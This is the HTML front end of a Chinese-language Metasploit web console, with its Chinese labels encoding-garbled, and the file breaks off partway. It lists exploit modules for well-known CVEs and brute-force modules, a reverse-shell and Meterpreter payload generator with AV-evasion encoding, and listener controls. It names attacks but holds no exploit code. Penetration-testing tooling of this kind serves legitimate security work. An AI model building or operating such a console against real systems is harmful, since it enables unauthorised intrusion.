<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TMbox - MSF å›¾å½¢åŒ–æ§åˆ¶å°</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { background-color: #0f172a; color: #e2e8f0; }
        .terminal-font { font-family: 'Consolas', 'Courier New', monospace; }
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: #1e293b; }
        ::-webkit-scrollbar-thumb { background: #475569; border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: #64748b; }
        .tab-active { background-color: #1e293b; border-bottom: 2px solid #ef4444; }
        .panel-tab.active { background-color: #334155; color: #fff; }
        .session-row:hover { background-color: #1e293b; }
        .sidebar-collapsed { width: 0 !important; padding: 0 !important; overflow: hidden; }
        .os-windows { color: #60a5fa; }
        .os-linux { color: #fbbf24; }
        .os-unknown { color: #94a3b8; }
        .action-btn { transition: all 0.2s; }
        .action-btn:hover { transform: scale(1.02); }
        .sidebar-section { border-bottom: 1px solid #334155; }
        .info-row { display: flex; justify-content: space-between; padding: 4px 0; }
        .info-label { color: #64748b; font-size: 10px; }
        .info-value { color: #e2e8f0; font-size: 10px; font-family: monospace; }
    </style>
</head>
<body class="h-screen flex flex-col overflow-hidden">

    <!-- é¡¶éƒ¨å¯¼èˆª -->
    <header class="bg-slate-900 border-b border-red-900/50 p-2 flex justify-between items-center shadow-lg z-10 shrink-0">
        <div class="flex items-center gap-3">
            <div class="w-3 h-3 rounded-full bg-red-500 animate-pulse"></div>
            <h1 class="text-lg font-bold text-red-500 tracking-wider">MSF <span class="text-slate-400">CONSOLE</span></h1>
            <span id="msfStatus" class="text-[10px] px-2 py-0.5 rounded bg-slate-800 text-slate-500">Connecting...</span>
            <span id="sessionCount" class="text-[10px] px-2 py-0.5 rounded bg-green-900/50 text-green-400 hidden">0 Sessions</span>
        </div>
        <div class="flex gap-2 items-center">
            <button onclick="toggleSidebar()" id="sidebarToggle" class="text-xs bg-purple-900/50 hover:bg-purple-800 text-purple-300 px-3 py-1.5 rounded border border-purple-900/50 transition">
                ä¼šè¯é¢æ¿
            </button>
            <button onclick="window.location.href='/'" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded border border-slate-700 transition">
                â† è¿”å›ä¸»é¡µ
            </button>
            <button onclick="killSession()" class="text-xs bg-red-900/50 hover:bg-red-800 text-red-400 px-3 py-1.5 rounded border border-red-900/50 transition">
                é‡ç½®ä¼šè¯
            </button>
        </div>
    </header>

    <!-- ä¸»ä½“å†…å®¹ -->
    <div class="flex flex-1 overflow-hidden">

        <!-- å·¦ä¾§ï¼šåŠŸèƒ½é¢æ¿ -->
        <div class="w-72 bg-slate-800 border-r border-slate-700 flex flex-col overflow-hidden shrink-0">

            <!-- é¢æ¿æ ‡ç­¾é¡µ -->
            <div class="flex bg-slate-900 border-b border-slate-700 text-[10px]">
                <button onclick="switchPanel('modules')" id="tab-modules" class="panel-tab active flex-1 py-2 font-medium text-slate-400 hover:text-white transition">æ¨¡å—</button>
                <button onclick="switchPanel('payloads')" id="tab-payloads" class="panel-tab flex-1 py-2 font-medium text-slate-400 hover:text-white transition">Payload</button>
                <button onclick="switchPanel('downloads')" id="tab-downloads" class="panel-tab flex-1 py-2 font-medium text-slate-400 hover:text-white transition">æ–‡ä»¶</button>
                <button onclick="switchPanel('listeners')" id="tab-listeners" class="panel-tab flex-1 py-2 font-medium text-slate-400 hover:text-white transition">ç›‘å¬</button>
                <button onclick="switchPanel('quickcmd')" id="tab-quickcmd" class="panel-tab flex-1 py-2 font-medium text-slate-400 hover:text-white transition">å¿«æ·</button>
            </div>

            <!-- æ¨¡å—é¢æ¿ -->
            <div id="panel-modules" class="panel-content flex-1 overflow-y-auto">
                <div class="p-2">
                    <label class="block text-[10px] text-slate-400 mb-1">é€‰æ‹©æ¨¡å—</label>
                    <select id="moduleSelect" onchange="loadModuleConfig()" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5 outline-none">
                        <optgroup label="ğŸ”¥ çƒ­é—¨æ¼æ´åˆ©ç”¨">
                            <option value="ms17_010">MS17-010 æ°¸æ’ä¹‹è“ (SMB)</option>
                            <option value="bluekeep">CVE-2019-0708 BlueKeep (RDP)</option>
                            <option value="netapi">MS08-067 NetAPI (è€ç³»ç»Ÿ)</option>
                            <option value="psexec">PsExec æ¨ªå‘ç§»åŠ¨</option>
                            <option value="wmi">WMI æ¨ªå‘ç§»åŠ¨</option>
                            <option value="winrm">WinRM æ¨ªå‘ç§»åŠ¨</option>
                        </optgroup>
                        <optgroup label="ğŸŒ Web åº”ç”¨æ¼æ´ - PHP">
                            <option value="php_cgi_argi">PHP CGI Argument Injection</option>
                            <option value="php_include">PHP æ–‡ä»¶åŒ…å« (é€šç”¨)</option>
                            <option value="phpmeterpreter">PHP Meterpreter (é€šç”¨)</option>
                            <option value="thinkphp_rce">ThinkPHP 5.x RCE</option>
                            <option value="thinkphp_rce2">ThinkPHP 5.0.23 RCE</option>
                            <option value="laravel_rce">Laravel CVE-2021-3129</option>
                            <option value="phpunit_rce">PHPUnit RCE</option>
                            <option value="phpmailer_rce">PHPMailer RCE</option>
                        </optgroup>
                        <optgroup label="ğŸŒ Web åº”ç”¨æ¼æ´ - Java">
                            <option value="log4j_rce">Log4j (Log4Shell) CVE-2021-44228</option>
                            <option value="spring4shell">Spring4Shell CVE-2022-22965</option>
                            <option value="spring_cloud_rce">Spring Cloud Gateway RCE</option>
                            <option value="struts2_rest">Struts2 REST RCE</option>
                            <option value="struts2_showcase">Struts2 Showcase RCE</option>
                            <option value="weblogic_rce">WebLogic T3 RCE</option>
                            <option value="weblogic_iiop">WebLogic IIOP RCE</option>
                            <option value="weblogic_xml">WebLogic XMLDecoder RCE</option>
                            <option value="tomcat_mgr">Tomcat Manager çˆ†ç ´</option>
                            <option value="tomcat_cve_2020">Tomcat CVE-2020-1938</option>
                            <option value="jboss_rce">JBoss JMXInvokerServlet</option>
                            <option value="jenkins_rce">Jenkins CLI RCE</option>
                            <option value="jenkins_script">Jenkins Script Console</option>
                            <option value="apache_flink">Apache Flink RCE</option>
                            <option value="apache_druid">Apache Druid RCE</option>
                            <option value="fastjson_rce">FastJSON RCE</option>
                            <option value="shiro_rce">Shiro RememberMe ååºåˆ—åŒ–</option>
                        </optgroup>
                        <optgroup label="ğŸŒ Web åº”ç”¨æ¼æ´ - å…¶ä»–">
                            <option value="apache_cve_2021">Apache CVE-2021-41773</option>
                            <option value="nginx_rce">Nginx é…ç½®é”™è¯¯åˆ©ç”¨</option>
                            <option value="iis_rce">IIS WebDAV RCE</option>
                            <option value="wordpress_rce">WordPress XML-RPC RCE</option>
                            <option value="drupal_rce">Drupalgeddon2 RCE</option>
                            <option value="joomla_rce">Joomla RCE</option>
                            <option value="cve_2021_26084">Confluence OGNL RCE</option>
                            <option value="cve_2022_26134">Confluence OGNL RCE 2022</option>
                            <option value="gitlab_rce">GitLab ExifTool RCE</option>
                            <option value="cacti_rce">Cacti RCE</option>
                            <option value="zabbix_rce">Zabbix Server RCE</option>
                            <option value="elastic_rce">Elasticsearch RCE</option>
                            <option value="mongo_rce">MongoDB æœªæˆæƒè®¿é—®</option>
                        </optgroup>
                        <optgroup label="ğŸ’¾ æ•°æ®åº“æ¼æ´">
                            <option value="mysql_auth">MySQL å¼±å£ä»¤çˆ†ç ´</option>
                            <option value="mysql_udf">MySQL UDF ææƒ</option>
                            <option value="mssql_auth">MSSQL å¼±å£ä»¤çˆ†ç ´</option>
                            <option value="mssql_rce">MSSQL RCE (xp_cmdshell)</option>
                            <option value="oracle_login">Oracle å¼±å£ä»¤çˆ†ç ´</option>
                            <option value="postgres_auth">PostgreSQL å¼±å£ä»¤çˆ†ç ´</option>
                            <option value="postgres_rce">PostgreSQL RCE</option>
                            <option value="redis_unauth">Redis æœªæˆæƒè®¿é—®</option>
                            <option value="redis_rce">Redis ä¸»ä»å¤åˆ¶ RCE</option>
                            <option value="memcached_unauth">Memcached æœªæˆæƒ</option>
                        </optgroup>
                        <optgroup label="ğŸ” æœåŠ¡æ¼æ´">
                            <option value="ssh_login">SSH å¼±å£ä»¤çˆ†ç ´</option>
                            <option value="ssh_libssh">LibSSH RCE</option>
                            <option value="ftp_login">FTP å¼±å£ä»¤çˆ†ç ´</option>
                            <option value="vsftpd_rce">VSFTPD 2.3.4 åé—¨</option>
                            <option value="proftpd_rce">ProFTPD RCE</option>
                            <option value="smb_version">SMB ç‰ˆæœ¬æ¢æµ‹</option>
                            <option value="smb_login">SMB å¼±å£ä»¤çˆ†ç ´</option>
                            <option value="samba_symlink">Samba Symlink RCE</option>
                            <option value="samba_is_known">Samba is_known_pipename</option>
                            <option value="rdp_rce">RDP BlueKeep</option>
                            <option value="vnc_auth">VNC å¼±å£ä»¤çˆ†ç ´</option>
                            <option value="telnet_login">Telnet å¼±å£ä»¤çˆ†ç ´</option>
                            <option value="smtp_login">SMTP å¼±å£ä»¤çˆ†ç ´</option>
                            <option value="ldap_login">LDAP å¼±å£ä»¤çˆ†ç ´</option>
                        </optgroup>
                        <optgroup label="ğŸ§ Linux ææƒ">
                            <option value="linux_dirty_cow">DirtyCow CVE-2016-5195</option>
                            <option value="linux_dirty_pipe">DirtyPipe CVE-2022-0847</option>
                            <option value="linux_pwnkit">PwnKit CVE-2021-4034</option>
                            <option value="linux_cve_2021_3156">Sudo Baronic</option>
                            <option value="linux_cve_2021_3560">Polkit pkexec</option>
                        </optgroup>
                        <optgroup label="ğŸªŸ Windows ææƒ">
                            <option value="win_printnightmare">PrintNightmare CVE-2021-34527</option>
                            <option value="win_printspooler">PrintSpooler RCE</option>
                            <option value="win_cve_2021_36934">HiveNightmare</option>
                            <option value="win_cve_2021_1675">PrintNightmare LPE</option>
                            <option value="win_noauth">NoAuth (Zerologon)</option>
                            <option value="win_petitpotam">PetitPotam</option>
                        </optgroup>
                        <optgroup label="ğŸ” æ‰«æä¸æ¢æµ‹">
                            <option value="portscan">TCP ç«¯å£æ‰«æ</option>
                            <option value="udp_scan">UDP ç«¯å£æ‰«æ</option>
                            <option value="http_dir">HTTP ç›®å½•æ‰«æ</option>
                            <option value="http_enum">HTTP æšä¸¾</option>
                            <option value="dns_enum">DNS æšä¸¾</option>
                            <option value="snmp_enum">SNMP æšä¸¾</option>
                            <option value="ntp_enum">NTP æšä¸¾</option>
                            <option value="fingerprint">æœåŠ¡æŒ‡çº¹è¯†åˆ«</option>
                        </optgroup>
                        <optgroup label="ğŸ“¥ ç›‘å¬å™¨">
                            <option value="handler">Multi Handler (é€šç”¨)</option>
                            <option value="handler_https">HTTPS Handler</option>
                            <option value="handler_bind">Bind Handler</option>
                        </optgroup>
                    </select>
                    <p id="moduleDesc" class="text-[9px] text-slate-500 mt-1 p-1.5 bg-slate-900/50 rounded">åˆ©ç”¨ Windows SMB åè®®æ¼æ´è¿œç¨‹æ‰§è¡Œä»£ç </p>
                </div>

                <div class="p-2 border-t border-slate-700">
                    <h3 class="text-[10px] font-bold text-yellow-500 mb-2">å‚æ•°é…ç½®</h3>
                    <div class="space-y-1.5">
                        <div>
                            <label class="block text-[9px] text-slate-400 mb-0.5">ç›®æ ‡ RHOSTS</label>
                            <input type="text" id="rhosts" placeholder="192.168.1.100" class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs outline-none">
                        </div>
                        <div class="grid grid-cols-2 gap-1.5">
                            <div>
                                <label class="block text-[9px] text-slate-400 mb-0.5">LHOST</label>
                                <input type="text" id="lhost" class="w-full bg-slate-900 text-blue-400 border border-slate-600 rounded p-1.5 text-xs outline-none">
                            </div>
                            <div>
                                <label class="block text-[9px] text-slate-400 mb-0.5">LPORT</label>
                                <input type="text" id="lport" value="4444" class="w-full bg-slate-900 text-blue-400 border border-slate-600 rounded p-1.5 text-xs outline-none">
                            </div>
                        </div>
                        <div id="payloadGroup">
                            <label class="block text-[9px] text-slate-400 mb-0.5">Payload</label>
                            <select id="payload" class="w-full bg-slate-900 text-slate-300 border border-slate-600 rounded p-1.5 text-xs outline-none">
                                <optgroup label="ğŸªŸ Windows">
                                    <option value="windows/x64/meterpreter/reverse_tcp">Windows x64 Meterpreter TCP</option>
                                    <option value="windows/x64/meterpreter/reverse_https">Windows x64 Meterpreter HTTPS</option>
                                    <option value="windows/x64/meterpreter/reverse_http">Windows x64 Meterpreter HTTP</option>
                                    <option value="windows/x64/shell/reverse_tcp">Windows x64 Shell TCP</option>
                                    <option value="windows/meterpreter/reverse_tcp">Windows x86 Meterpreter TCP</option>
                                    <option value="windows/shell/reverse_tcp">Windows x86 Shell TCP</option>
                                </optgroup>
                                <optgroup label="ğŸ§ Linux">
                                    <option value="linux/x64/meterpreter/reverse_tcp">Linux x64 Meterpreter TCP</option>
                                    <option value="linux/x64/shell/reverse_tcp">Linux x64 Shell TCP</option>
                                    <option value="linux/x86/meterpreter/reverse_tcp">Linux x86 Meterpreter TCP</option>
                                </optgroup>
                                <optgroup label="ğŸ˜ PHP/Java/Python">
                                    <option value="php/meterpreter/reverse_tcp">PHP Meterpreter</option>
                                    <option value="java/meterpreter/reverse_tcp">Java Meterpreter</option>
                                    <option value="python/meterpreter/reverse_tcp">Python Meterpreter</option>
                                </optgroup>
                            </select>
                        </div>
                    </div>
                </div>

                <div class="p-2 border-t border-slate-700">
                    <button onclick="runModule()" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-3 rounded text-xs">âš¡ æ‰§è¡Œæ¨¡å—</button>
                </div>
            </div>

            <!-- Payload ç”Ÿæˆé¢æ¿ -->
            <div id="panel-payloads" class="panel-content flex-1 overflow-y-auto hidden">
                <div class="p-2">
                    <h3 class="text-[10px] font-bold text-green-400 mb-2">å¿«é€Ÿç”Ÿæˆ Payload</h3>
                    <div class="space-y-1.5 mb-3">
                        <div>
                            <label class="block text-[9px] text-slate-400 mb-0.5">Payload ç±»å‹</label>
                            <select id="genPayload" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5 outline-none">
                                <optgroup label="ğŸªŸ Windows Payloads">
                                    <option value="windows/x64/meterpreter/reverse_tcp">Windows x64 Meterpreter TCP</option>
                                    <option value="windows/x64/meterpreter/reverse_https">Windows x64 Meterpreter HTTPS</option>
                                    <option value="windows/x64/meterpreter/reverse_http">Windows x64 Meterpreter HTTP</option>
                                    <option value="windows/x64/meterpreter/bind_tcp">Windows x64 Meterpreter Bind</option>
                                    <option value="windows/x64/meterpreter/reverse_winhttp">Windows x64 Meterpreter WinHTTP</option>
                                    <option value="windows/x64/shell/reverse_tcp">Windows x64 Shell TCP</option>
                                    <option value="windows/x64/exec">Windows x64 Exec CMD</option>
                                    <option value="windows/x64/powershell/reverse_tcp">Windows x64 PowerShell</option>
                                    <option value="windows/meterpreter/reverse_tcp">Windows x86 Meterpreter TCP</option>
                                    <option value="windows/meterpreter/reverse_https">Windows x86 Meterpreter HTTPS</option>
                                    <option value="windows/shell/reverse_tcp">Windows x86 Shell TCP</option>
                                    <option value="windows/adduser">Windows æ·»åŠ ç”¨æˆ·</option>
                                </optgroup>
                                <optgroup label="ğŸ§ Linux Payloads">
                                    <option value="linux/x64/meterpreter/reverse_tcp">Linux x64 Meterpreter TCP</option>
                                    <option value="linux/x64/meterpreter/reverse_http">Linux x64 Meterpreter HTTP</option>
                                    <option value="linux/x64/meterpreter/bind_tcp">Linux x64 Meterpreter Bind</option>
                                    <option value="linux/x64/shell/reverse_tcp">Linux x64 Shell TCP</option>
                                    <option value="linux/x64/shell_bind_tcp">Linux x64 Shell Bind</option>
                                    <option value="linux/x86/meterpreter/reverse_tcp">Linux x86 Meterpreter TCP</option>
                                    <option value="linux/x86/shell/reverse_tcp">Linux x86 Shell TCP</option>
                                </optgroup>
                                <optgroup label="ğŸ˜ PHP Payloads">
                                    <option value="php/meterpreter/reverse_tcp">PHP Meterpreter TCP</option>
                                    <option value="php/meterpreter/bind_tcp">PHP Meterpreter Bind</option>
                                    <option value="php/reverse_php">PHP Reverse Shell</option>
                                    <option value="php/exec">PHP Exec CMD</option>
                                </optgroup>
                                <optgroup label="â˜• Java Payloads">
                                    <option value="java/jsp_shell_reverse_tcp">JSP Reverse Shell</option>
                                    <option value="java/meterpreter/reverse_tcp">Java Meterpreter TCP</option>
                                    <option value="java/shell/reverse_tcp">Java Shell TCP</option>
                                    <option value="java/jsp_shell_bind_tcp">JSP Bind Shell</option>
                                </optgroup>
                                <optgroup label="ğŸ Python Payloads">
                                    <option value="python/meterpreter/reverse_tcp">Python Meterpreter TCP</option>
                                    <option value="python/meterpreter/reverse_http">Python Meterpreter HTTP</option>
                                    <option value="python/shell/reverse_tcp">Python Reverse Shell</option>
                                    <option value="python/shell_bind_tcp">Python Bind Shell</option>
                                </optgroup>
                                <optgroup label="ğŸ“¦ Node.js Payloads">
                                    <option value="nodejs/shell_reverse_tcp">Node.js Reverse Shell</option>
                                    <option value="nodejs/shell_bind_tcp">Node.js Bind Shell</option>
                                    <option value="nodejs/meterpreter/reverse_tcp">Node.js Meterpreter</option>
                                </optgroup>
                                <optgroup label="ğŸŒ Web Payloads">
                                    <option value="cmd/unix/reverse_bash">Bash Reverse Shell</option>
                                    <option value="cmd/unix/reverse_netcat">Netcat Reverse Shell</option>
                                    <option value="cmd/unix/reverse_perl">Perl Reverse Shell</option>
                                    <option value="cmd/unix/reverse_ruby">Ruby Reverse Shell</option>
                                    <option value="cmd/windows/reverse_powershell">PowerShell Reverse</option>
                                    <option value="cmd/windows/adduser">CMD æ·»åŠ ç”¨æˆ·</option>
                                </optgroup>
                                <optgroup label="ğŸ“± Android/iOS Payloads">
                                    <option value="android/meterpreter/reverse_tcp">Android Meterpreter TCP</option>
                                    <option value="android/meterpreter/reverse_http">Android Meterpreter HTTP</option>
                                    <option value="android/shell/reverse_tcp">Android Shell TCP</option>
                                </optgroup>
                            </select>
                        </div>
                        <div class="grid grid-cols-2 gap-1.5">
                            <div>
                                <label class="block text-[9px] text-slate-400 mb-0.5">LHOST</label>
                                <input type="text" id="genLhost" class="w-full bg-slate-900 text-blue-400 border border-slate-600 rounded p-1.5 text-xs outline-none">
                            </div>
                            <div>
                                <label class="block text-[9px] text-slate-400 mb-0.5">LPORT</label>
                                <input type="text" id="genLport" value="4444" class="w-full bg-slate-900 text-blue-400 border border-slate-600 rounded p-1.5 text-xs outline-none">
                            </div>
                        </div>
                        <div>
                            <label class="block text-[9px] text-slate-400 mb-0.5">è¾“å‡ºæ ¼å¼</label>
                            <select id="genFormat" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5 outline-none">
                                <optgroup label="å¯æ‰§è¡Œæ–‡ä»¶">
                                    <option value="exe">exe (Windows)</option>
                                    <option value="elf">elf (Linux)</option>
                                    <option value="macho">macho (macOS)</option>
                                    <option value="dll">dll (Windows DLL)</option>
                                </optgroup>
                                <optgroup label="è„šæœ¬æ ¼å¼">
                                    <option value="php">php (PHPè„šæœ¬)</option>
                                    <option value="jsp">jsp (Java JSP)</option>
                                    <option value="war">war (Java WAR)</option>
                                    <option value="asp">asp (ASP Classic)</option>
                                    <option value="aspx">aspx (ASP.NET)</option>
                                    <option value="py">py (Python)</option>
                                    <option value="rb">rb (Ruby)</option>
                                    <option value="pl">pl (Perl)</option>
                                    <option value="sh">sh (Bash)</option>
                                    <option value="ps1">ps1 (PowerShell)</option>
                                </optgroup>
                                <optgroup label="å…¶ä»–æ ¼å¼">
                                    <option value="raw">raw (åŸå§‹äºŒè¿›åˆ¶)</option>
                                    <option value="hex">hex (åå…­è¿›åˆ¶)</option>
                                    <option value="bash">bash (Bashå‘½ä»¤)</option>
                                    <option value="c">c (Cä»£ç )</option>
                                    <option value="csharp">csharp (C#)</option>
                                    <option value="java">java (Javaç±»)</option>
                                    <option value="vba">vba (VBAå®)</option>
                                    <option value="hta-psh">hta-psh (HTA)</option>
                                    <option value="loop-vbs">loop-vbs (VBSå¾ªç¯)</option>
                                </optgroup>
                            </select>
                        </div>
                        <div>
                            <label class="block text-[9px] text-slate-400 mb-0.5">ç¼–ç å™¨ (å¯é€‰)</label>
                            <select id="genEncoder" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5 outline-none">
                                <option value="">æ— ç¼–ç </option>
                                <option value="x86/shikata_ga_nai">shikata_ga_nai (æ¨è)</option>
                                <option value="x86/call4_dword_xor">call4_dword_xor</option>
                                <option value="x86/countdown">countdown</option>
                                <option value="x86/fnstenv_mov">fnstenv_mov</option>
                                <option value="x86/jmp_call_additive">jmp_call_additive</option>
                                <option value="cmd/echo">cmd/echo</option>
                                <option value="cmd/ifs">cmd/ifs</option>
                                <option value="generic/none">generic/none</option>
                            </select>
                        </div>
                    </div>
                    <button onclick="generatePayload()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-1.5 px-3 rounded text-xs">ğŸ› ï¸ ç”Ÿæˆ Payload</button>

                    <div class="mt-3">
                        <h4 class="text-[9px] font-bold text-slate-400 mb-1">å¿«é€Ÿç”Ÿæˆ</h4>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="quickGeneratePayload('windows', 'exe')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Windows .exe</button>
                            <button onclick="quickGeneratePayload('linux', 'elf')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Linux .elf</button>
                            <button onclick="quickGeneratePayload('php', 'php')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">PHP .php</button>
                            <button onclick="quickGeneratePayload('jsp', 'jsp')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">JSP .jsp</button>
                            <button onclick="quickGeneratePayload('python', 'py')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Python .py</button>
                            <button onclick="quickGeneratePayload('bash', 'sh')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Bash .sh</button>
                            <button onclick="quickGeneratePayload('powershell', 'ps1')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">PowerShell</button>
                            <button onclick="quickGeneratePayload('dll', 'dll')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">DLL .dll</button>
                            <button onclick="quickGeneratePayload('war', 'war')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">WAR .war</button>
                            <button onclick="quickGeneratePayload('aspx', 'aspx')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">ASPX .aspx</button>
                        </div>
                    </div>

                    <div class="mt-3">
                        <h4 class="text-[9px] font-bold text-slate-400 mb-1">ç¼–ç ç”Ÿæˆ (å…æ€)</h4>
                        <div class="grid grid-cols-1 gap-1">
                            <button onclick="generateEncodedPayload('windows', 'exe', 'x86/shikata_ga_nai')" class="text-[9px] bg-red-900/50 hover:bg-red-800 p-1.5 rounded text-red-300 text-left">Windows ç¼–ç  (shikata_ga_nai)</button>
                            <button onclick="generateEncodedPayload('windows', 'exe', 'x86/shikata_ga_nai', 5)" class="text-[9px] bg-red-900/50 hover:bg-red-800 p-1.5 rounded text-red-300 text-left">Windows å¤šæ¬¡ç¼–ç  (5æ¬¡)</button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- æ–‡ä»¶ä¸‹è½½é¢æ¿ -->
            <div id="panel-downloads" class="panel-content flex-1 overflow-y-auto hidden">
                <div class="p-2">
                    <div class="flex justify-between items-center mb-2">
                        <h3 class="text-[10px] font-bold text-cyan-400">Payload æ–‡ä»¶</h3>
                        <button onclick="refreshPayloadFiles()" class="text-[9px] bg-slate-700 hover:bg-slate-600 text-slate-300 px-2 py-0.5 rounded">åˆ·æ–°</button>
                    </div>
                    <div id="payloadFilesList" class="space-y-1 max-h-48 overflow-y-auto">
                        <div class="text-center text-slate-600 text-[10px] py-3">ç‚¹å‡»åˆ·æ–°...</div>
                    </div>
                </div>
            </div>

            <!-- ç›‘å¬å™¨é¢æ¿ -->
            <div id="panel-listeners" class="panel-content flex-1 overflow-y-auto hidden">
                <div class="p-2">
                    <h3 class="text-[10px] font-bold text-blue-400 mb-2">å¿«é€Ÿç›‘å¬å™¨</h3>
                    <div class="space-y-1.5 mb-3">
                        <div class="grid grid-cols-2 gap-1.5">
                            <div>
                                <label class="block text-[9px] text-slate-400 mb-0.5">LHOST</label>
                                <input type="text" id="handlerLhost" class="w-full bg-slate-900 text-blue-400 border border-slate-600 rounded p-1.5 text-xs outline-none">
                            </div>
                            <div>
                                <label class="block text-[9px] text-slate-400 mb-0.5">LPORT</label>
                                <input type="text" id="handlerLport" value="4444" class="w-full bg-slate-900 text-blue-400 border border-slate-600 rounded p-1.5 text-xs outline-none">
                            </div>
                        </div>
                    </div>
                    <button onclick="startHandler()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-1.5 px-3 rounded text-xs mb-2">å¯åŠ¨ç›‘å¬</button>

                    <div class="mt-2">
                        <h4 class="text-[9px] font-bold text-slate-400 mb-1">é¢„è®¾ç›‘å¬</h4>
                        <div class="space-y-1">
                            <button onclick="presetHandler(4444, 'windows/x64/meterpreter/reverse_tcp')" class="w-full text-left text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300 flex justify-between">
                                <span>Windows (4444)</span><span class="text-blue-400">TCP</span>
                            </button>
                            <button onclick="presetHandler(5555, 'linux/x64/meterpreter/reverse_tcp')" class="w-full text-left text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300 flex justify-between">
                                <span>Linux (5555)</span><span class="text-yellow-400">TCP</span>
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- å¿«æ·å‘½ä»¤é¢æ¿ -->
            <div id="panel-quickcmd" class="panel-content flex-1 overflow-y-auto hidden">
                <div class="p-2 space-y-2">
                    <!-- æ ¸å¿ƒå‘½ä»¤ -->
                    <div>
                        <h4 class="text-[9px] text-yellow-400 mb-1 font-bold">âš¡ æ ¸å¿ƒå‘½ä»¤</h4>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="quickCmd('help')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">å¸®åŠ©</button>
                            <button onclick="quickCmd('version')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">ç‰ˆæœ¬</button>
                            <button onclick="quickCmd('banner')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">æ¨ªå¹…</button>
                            <button onclick="quickCmd('connect')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">è¿æ¥ä¸»æœº</button>
                        </div>
                    </div>

                    <!-- æ¨¡å—å‘½ä»¤ -->
                    <div>
                        <h4 class="text-[9px] text-blue-400 mb-1 font-bold">ğŸ“¦ æ¨¡å—å‘½ä»¤</h4>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="quickCmd('show all')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">æ˜¾ç¤ºå…¨éƒ¨</button>
                            <button onclick="quickCmd('show exploits')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">æ¼æ´åˆ©ç”¨</button>
                            <button onclick="quickCmd('show payloads')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">è½½è·åˆ—è¡¨</button>
                            <button onclick="quickCmd('show auxiliary')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">è¾…åŠ©æ¨¡å—</button>
                            <button onclick="quickCmd('show post')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">åæ¸—é€</button>
                            <button onclick="quickCmd('show encoders')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">ç¼–ç å™¨</button>
                            <button onclick="quickCmd('show nops')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">ç©ºæŒ‡ä»¤</button>
                            <button onclick="quickCmd('search ')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">æœç´¢æ¨¡å—</button>
                            <button onclick="quickCmd('info')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">æ¨¡å—ä¿¡æ¯</button>
                            <button onclick="quickCmd('back')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">è¿”å›ä¸Šçº§</button>
                        </div>
                    </div>

                    <!-- ä»»åŠ¡/ä¼šè¯ç®¡ç† -->
                    <div>
                        <h4 class="text-[9px] text-green-400 mb-1 font-bold">ğŸ“‹ ä»»åŠ¡ä¸ä¼šè¯</h4>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="quickCmd('sessions -l')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">ä¼šè¯åˆ—è¡¨</button>
                            <button onclick="quickCmd('sessions -K')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">å…³é—­æ‰€æœ‰ä¼šè¯</button>
                            <button onclick="quickCmd('jobs')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">ä»»åŠ¡åˆ—è¡¨</button>
